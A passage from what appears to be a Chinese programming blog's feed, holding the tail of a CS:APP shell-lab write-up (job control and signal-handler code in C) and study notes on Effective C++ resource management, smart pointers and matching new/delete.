class="keyword">if</span>(argv[<span class="number">1</span>][<span class="number">0</span>]==<span class="string">&#x27;%&#x27;</span>)&#123;             </span><br><span class="line">       <span class="keyword">if</span>(<span class="built_in">sscanf</span>(&amp;argv[<span class="number">1</span>][<span class="number">1</span>], <span class="string">&quot;%d&quot;</span>, &amp;id) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            job = <span class="built_in">getjobjid</span>(jobs, id);  </span><br><span class="line">            <span class="keyword">if</span>(job==<span class="literal">NULL</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%%%d: No such job\n&quot;</span>, id);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">isdigit</span>(argv[<span class="number">1</span>][<span class="number">0</span>])) &#123;  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s: argument must be a PID or %%jobid\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">         id = <span class="built_in">atoi</span>(argv[<span class="number">1</span>]);</span><br><span class="line">         job = <span class="built_in">getjobpid</span>(jobs,id);</span><br><span class="line">           <span class="keyword">if</span>(job == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">&quot;%d: No such job\n&quot;</span>, id);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">kill</span>(-(job-&gt;pid),SIGCONT);</span><br><span class="line"></span><br><span class="line">    job-&gt;state = bg_fg;</span><br><span class="line">    </span><br><span class="line">   <span class="keyword">if</span>(bg_fg==BG)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) %s&quot;</span>,job-&gt;jid, job-&gt;pid, job-&gt;cmdline);</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        <span class="built_in">waitfg</span>(job-&gt;pid);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>等待前台命令执行完成。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">waitfg</span><span class="params">(<span class="type">pid_t</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="type">sigset_t</span> mask_all, prev_all;</span><br><span class="line">    <span class="built_in">sigfillset</span>(&amp;mask_all);<span class="comment">//把每个信号添加到mask_all</span></span><br><span class="line">    <span class="built_in">sigemptyset</span>(&amp;prev_all);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)        <span class="comment">//反复检测进程状态</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">sigprocmask</span>(SIG_BLOCK, &amp;mask_all, <span class="literal">NULL</span>);    <span class="comment">//访问全局变量，阻塞信号</span></span><br><span class="line">         <span class="keyword">struct</span> <span class="title class_">job_t</span> *fg_job = <span class="built_in">getjobpid</span>(jobs,pid);</span><br><span class="line">        <span class="built_in">sigprocmask</span>(SIG_SETMASK, &amp;prev_all, <span class="literal">NULL</span>);  </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!fg_job || fg_job-&gt;state != FG)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="built_in">sleep</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面是信号处理</p><p>处理终止的子进程：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">sigchld_handler</span><span class="params">(<span class="type">int</span> sig)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> olderrno = errno;</span><br><span class="line">    <span class="type">int</span> status;</span><br><span class="line">    <span class="type">sigset_t</span> mask_all, prev_all;</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">     <span class="keyword">struct</span> <span class="title class_">job_t</span>* job;</span><br><span class="line">    <span class="built_in">sigfillset</span>(&amp;mask_all);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>((pid = <span class="built_in">waitpid</span>(<span class="number">-1</span>, &amp;status, WNOHANG | WUNTRACED)) &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">sigprocmask</span>(SIG_BLOCK, &amp;mask_all, &amp;prev_all);</span><br><span class="line">         job = <span class="built_in">getjobpid</span>(jobs,pid);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">WIFSTOPPED</span>(status))      <span class="comment">//子进程是因SIGSTOP停止的</span></span><br><span class="line">            &#123;</span><br><span class="line">                </span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Job [%d] (%d) terminated by signal 20\n&quot;</span>,job-&gt;jid,job-&gt;pid);</span><br><span class="line">                job-&gt;state = ST;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">WIFSIGNALED</span>(status))        <span class="comment">//子进程因SIGTSTP终止</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Job [%d] (%d) terminated by signal 2\n&quot;</span>,job-&gt;jid,job-&gt;pid);</span><br><span class="line">                <span class="built_in">deletejob</span>(jobs,pid);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">WIFEXITED</span>(status))&#123;                 <span class="comment">//正常终止</span></span><br><span class="line">            <span class="built_in">deletejob</span>(jobs, pid);</span><br><span class="line">        &#125;</span><br><span class="line">  </span><br><span class="line">        <span class="built_in">sigprocmask</span>(SIG_SETMASK, &amp;prev_all, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">       </span><br><span class="line">    errno = olderrno;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>处理ctrl+c中断，发送终止进程给前台进程。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">sigint_handler</span><span class="params">(<span class="type">int</span> sig)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> olderrno = errno;</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="type">sigset_t</span> mask_all, prev_all;</span><br><span class="line">    <span class="built_in">sigfillset</span>(&amp;mask_all);</span><br><span class="line">    <span class="built_in">sigprocmask</span>(SIG_BLOCK, &amp;mask_all, &amp;prev_all);</span><br><span class="line">  <span class="keyword">if</span>((pid = <span class="built_in">fgpid</span>(jobs)) != <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">sigprocmask</span>(SIG_SETMASK, &amp;prev_all, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">kill</span>(-pid, SIGINT);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    errno = olderrno;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>处理ctr+z中断，挂起前台进程。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">sigtstp_handler</span><span class="params">(<span class="type">int</span> sig)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> olderrno = errno;</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="type">sigset_t</span> mask_all, prev_all;</span><br><span class="line">    <span class="built_in">sigfillset</span>(&amp;mask_all);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sigprocmask</span>(SIG_BLOCK, &amp;mask_all, &amp;prev_all);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>((pid = <span class="built_in">fgpid</span>(jobs)) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">sigprocmask</span>(SIG_SETMASK, &amp;prev_all, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">kill</span>(-pid, SIGSTOP);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    errno = olderrno;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> csapp </category>
          
          <category> lab </category>
          
      </categories>
      
      
        <tags>
            
            <tag> csapp </tag>
            
            <tag> lab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EffectiveCpp0x3</title>
      <link href="/2024/04/05/C&amp;C++/Effective%20Cpp0x3/"/>
      <url>/2024/04/05/C&amp;C++/Effective%20Cpp0x3/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h1 id="Resource-Management"><a href="#Resource-Management" class="headerlink" title="Resource Management"></a>Resource Management</h1><ul><li>如内存，互斥锁，数据库连接，网络sockets……</li><li>重要的是，当你不再使用它了，应该将它还给系统。</li></ul><h3 id="13-Use-objects-to-manage-resources"><a href="#13-Use-objects-to-manage-resources" class="headerlink" title="13. Use objects to manage resources."></a>13. Use objects to manage resources.</h3><ul><li><p>获得资源后立刻放进<code>管理对象(managing object)</code> 内。“资源取得时机便是初始化时机” (Resource Acquisition Is Initialization; <code>RAII</code>) 。</p></li><li><p>管理对象(managing object) 运用<code>析构函数</code>确保资源被释放。</p></li></ul><blockquote><p>为什么手动释放堆内存容易出错？</p><p>e.g:</p><p>Investment * createlnvestment();</p><p>void f ()<br>{<br>Investment* plnv = createlnvestment();</p><p>……</p><p>delete plnv;</p><p>return;</p><p>}</p><p>//若……中有return导致提前返回，则会导致资源泄露，且不易察觉</p></blockquote><ul><li><code>std::auto_ptr</code>:已被弃用。由于其拷贝时原先的指针会指向null，致潜在的资源泄漏和行为不确定性。<code>auto_ptr</code> 被 C++11 中引入的 <code>unique_ptr</code> 所替代。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Test</span>() &#123; std::cout &lt;&lt; <span class="string">&quot;Test Created\n&quot;</span>; &#125;</span><br><span class="line">    ~<span class="built_in">Test</span>() &#123; std::cout &lt;&lt; <span class="string">&quot;Test Destroyed\n&quot;</span>; &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">greet</span><span class="params">()</span> </span>&#123; std::cout &lt;&lt; <span class="string">&quot;Hello, World!\n&quot;</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="function">std::unique_ptr&lt;Test&gt; <span class="title">ptr1</span><span class="params">(<span class="keyword">new</span> Test())</span></span>; </span><br><span class="line">    <span class="comment">//Test Created</span></span><br><span class="line">    ptr1-&gt;<span class="built_in">greet</span>(); </span><br><span class="line">    <span class="comment">//Hello, World!</span></span><br><span class="line">    <span class="comment">//Test Destroyed</span></span><br><span class="line">    &#125;       <span class="comment">//离开作用域，自动删除其管理的对象，防止内存泄露</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="function">std::unique_ptr&lt;Test&gt; <span class="title">ptr2</span><span class="params">(<span class="keyword">new</span> Test())</span></span>;</span><br><span class="line">    <span class="comment">//Test Created</span></span><br><span class="line">    std::unique_ptr&lt;Test&gt; ptr3 = std::<span class="built_in">move</span>(ptr2);       <span class="comment">//通过移动语义修改对象的所有权</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!ptr2) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;ptr2 is now empty.\n&quot;</span>;    <span class="comment">//ptr2值为nullptr</span></span><br><span class="line">        <span class="comment">//ptr2 is now empty.</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!ptr3) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;ptr3 is now empty.\n&quot;</span>;   </span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    ptr3-&gt;<span class="built_in">greet</span>();</span><br><span class="line">    <span class="comment">//Hello, World!</span></span><br><span class="line">    <span class="comment">//Test Destroyed</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>“引用计数智能指针”(Reference Counted Smart Pointer)，即<code>std::shared_ptr</code>,现已加入std标准库豪华套餐!<code>环状引用问题</code>可用<code>weak_ptr</code>解决</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Test</span>() &#123; std::cout &lt;&lt; <span class="string">&quot;Test Created\n&quot;</span>; &#125;</span><br><span class="line">    ~<span class="built_in">Test</span>() &#123; std::cout &lt;&lt; <span class="string">&quot;Test Destroyed\n&quot;</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::shared_ptr&lt;Test&gt; ptr1 = std::<span class="built_in">make_shared</span>&lt;Test&gt;();</span><br><span class="line">    &#123;</span><br><span class="line">        std::shared_ptr&lt;Test&gt; ptr2 = ptr1; <span class="comment">// 引用计数增加</span></span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Inside block: ptr1 and ptr2 are both pointing to the object.\n&quot;</span>;</span><br><span class="line">        <span class="comment">// 当 ptr2 离开作用域并被销毁，引用计数减少</span></span><br><span class="line">    &#125;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Outside block: only ptr1 is pointing to the object.\n&quot;</span>;</span><br><span class="line">    <span class="comment">// 当 ptr1 也被销毁，引用计数为0，对象被删除</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="请记住"><a href="#请记住" class="headerlink" title="请记住"></a>请记住</h4><ul><li>防止资源泄漏，请使用<code>RAII对象</code>，它们在构造函数中获得资源并在析构函数中释放资源。</li><li>两个常被使用的<code>RAII classes</code> 分别是<code>std::shared _ptr</code> 和<code>unique_ptr</code> 。前者通常是较佳选择，因为其copy 行为比较直观。</li></ul><h3 id="14-Think-carefully-about-copying-behavior-in-resource-managing-classes"><a href="#14-Think-carefully-about-copying-behavior-in-resource-managing-classes" class="headerlink" title="14. Think carefully about copying behavior in resource-managing classes"></a>14. Think carefully about copying behavior in resource-managing classes</h3><p>对于<code>RAII</code>对象的复制，我们在大多数时候有一下两种可能：</p><ol><li>禁止复制，如数据库连接具有<code>唯一性</code>的特性，类中堆内存可能因执行多次<code>delete</code>导致程序发生不明确行为。</li><li>对底层资源祭出<code>“引用计数法”</code></li></ol><p>若当<code>引用次数为0</code>时，我们还想要做其他行为。那么则可以为<code>shared_ptr</code>指定<code>“删除器”</code>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Entity</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">log</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;Log Function&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Entity</span>()</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;Constructor!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">~<span class="built_in">Entity</span>()</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;Destroctor!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">deleter</span><span class="params">(Entity* ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;Deleter!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">delete</span> ptr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">auto</span> e = std::<span class="built_in">shared_ptr</span>&lt;Entity&gt;(<span class="keyword">new</span> Entity,Entity::deleter);</span><br><span class="line">e-&gt;<span class="built_in">log</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">Constructor!</span><br><span class="line">Log Function</span><br><span class="line">Deleter!</span><br><span class="line">Destroctor!</span><br><span class="line"><span class="comment">//调用顺序</span></span><br></pre></td></tr></table></figure><h4 id="请记住-1"><a href="#请记住-1" class="headerlink" title="请记住"></a>请记住</h4><ul><li>复制RAII 对象必须一并复制它所管理的资源，所以资源的copying 行为决定RAII 对象的copying 行为</li><li>普遍而常见的RAII class copying 行为是：<code>抑制copying</code> 、<code>施行引用计数法(reference counting)</code>。不过其他行为也都可能被实现。</li></ul><h3 id="15-Provide-access-to-raw-resources-in-resource-managing-classes"><a href="#15-Provide-access-to-raw-resources-in-resource-managing-classes" class="headerlink" title="15. Provide access to raw resources in resource-managing classes"></a>15. Provide access to raw resources in resource-managing classes</h3><p>//TODO</p><h4 id="请记住-2"><a href="#请记住-2" class="headerlink" title="请记住"></a>请记住</h4><h3 id="16-Use-the-same-form-in-corresponding-uses-of-new-and-delete"><a href="#16-Use-the-same-form-in-corresponding-uses-of-new-and-delete" class="headerlink" title="16. Use the same form in corresponding uses of new and delete"></a>16. Use the same form in corresponding uses of new and delete</h3><ul><li><code>new</code>和<code>delete</code>实际是由<code>operator new</code>和<code>operator delete</code>函数实现的。</li><li>如果你在new 表达式中使用［］，必须在相应的delete 表达式中也使用［］。如果你在new 表达式中不使用［］，一定不要在相应的delete 表达式中使用［］。</li></ul><p>内存布局：</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240408171300509.png" alt="image-20240408171300509"></p><p>我们最好尽量不要对数组形式做<code>typedef</code>或<code>define</code>动作，而是采用<code>vector</code>等<code>templates</code>代替它：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> std::string Son[<span class="number">4</span>];<span class="comment">//假设有四个儿子</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::string* Randolfluo = <span class="keyword">new</span> Son;</span><br><span class="line">Randolfluo[<span class="number">0</span>] = <span class="string">&quot;123&quot;</span>;</span><br><span class="line">Randolfluo[<span class="number">1</span>] = <span class="string">&quot;456&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> Randolfluo;<span class="comment">//应为delete[] Randolfluo；</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//我们使用valgrind来分析下：</span></span><br><span class="line"> cpptools  valgrind --leak-check=yes ./a.out </span><br><span class="line">  User</span><br><span class="line">==<span class="number">4172</span>== Invalid <span class="built_in">free</span>() / <span class="keyword">delete</span> / <span class="keyword">delete</span>[] / <span class="built_in">realloc</span>()</span><br><span class="line">==<span class="number">4172</span>==    at <span class="number">0x484BB6F</span>: <span class="keyword">operator</span> <span class="built_in">delete</span>(<span class="type">void</span>*, <span class="type">unsigned</span> <span class="type">long</span>) (in /usr/libexec/valgrind/vgpreload_memcheck-amd64-linux.so)</span><br><span class="line">==<span class="number">4172</span>==    by <span class="number">0x1092A7</span>: <span class="built_in">main</span> (in /home/randolfluo/cpptools/a.out)</span><br><span class="line"><span class="comment">//在主函数，程序尝试释放一个无效的内存地址。</span></span><br><span class="line">==<span class="number">4172</span>==  Address <span class="number">0x4dd6c88</span> is <span class="number">8</span> bytes inside a block of size <span class="number">136</span> alloc<span class="string">&#x27;d</span></span><br><span class="line"><span class="string">==4172==    at 0x484A2F3: operator new[](unsigned long) (in /usr/libexec/valgrind/vgpreload_memcheck-amd64-linux.so)</span></span><br><span class="line"><span class="string">==4172==    by 0x109223: main (in /home/randolfluo/cpptools/a.out)   </span></span><br><span class="line"><span class="string">// 在主函数，程序尝试释放的地址位于一个大小为136字节的块内，而这个块是通过调用operator new[]进行分配的。</span></span><br><span class="line"><span class="string">//可以看到，程序发生了内存泄露，原因是new和delete的操作符不匹配</span></span><br><span class="line"><span class="string">     </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//使用vector：</span></span><br><span class="line"><span class="string">#include &lt;iostream&gt;</span></span><br><span class="line"><span class="string">#include&lt;vector&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">typedef std::vector&lt;std::string&gt; Son;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">int main()</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">Son son(4);</span></span><br><span class="line"><span class="string">son.push_back(&quot;123&quot;);</span></span><br><span class="line"><span class="string">son.push_back(&quot;456&quot;);</span></span><br><span class="line"><span class="string">return 0;</span></span><br><span class="line"><span class="string">&#125;   </span></span><br><span class="line"><span class="string">     </span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><blockquote><p><code>typedef</code>和<code>define</code>的区别：</p><ul><li><p><code>typedef</code>是C++的关键字，用于为现有的类型定义一个新的名称（别名）。它在编译时处理，由编译器解释和应用。<code>typedef</code>只能用于类型的别名，不能用于定义常量或宏函数。</p></li><li><p><code>#define</code>是C和C++中的预处理指令，用于定义宏。它在预处理阶段处理，即在编译之前，文本替换就已经发生了。<code>#define</code>可以用来定义常量、宏函数，或者类型的别名，</p></li></ul></blockquote><h4 id="请记住-3"><a href="#请记住-3" class="headerlink" title="请记住"></a>请记住</h4><ul><li>如果你在new 表达式中使用［］，必须在相应的delete 表达式中也使用［］。如果你在new 表达式中不使用［］，一定不要在相应的delete 表达式中使用［］。</li></ul><h3 id="17-Store-newed-objects-in-smart-pointers-in-standalone-statements"><a href="#17-Store-newed-objects-in-smart-pointers-in-standalone-statements" class="headerlink" title="17. Store newed objects in smart pointers in standalone statements"></a>17. Store newed objects in smart pointers in standalone statements</h3><ul><li>其实就是<code>C++的编译器</code>可以对参数的<code>执行顺序</code>进行改变——进行程序优化。<code>Java</code>和<code>C#</code>则会按照特定次序完成函数参数的核算。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 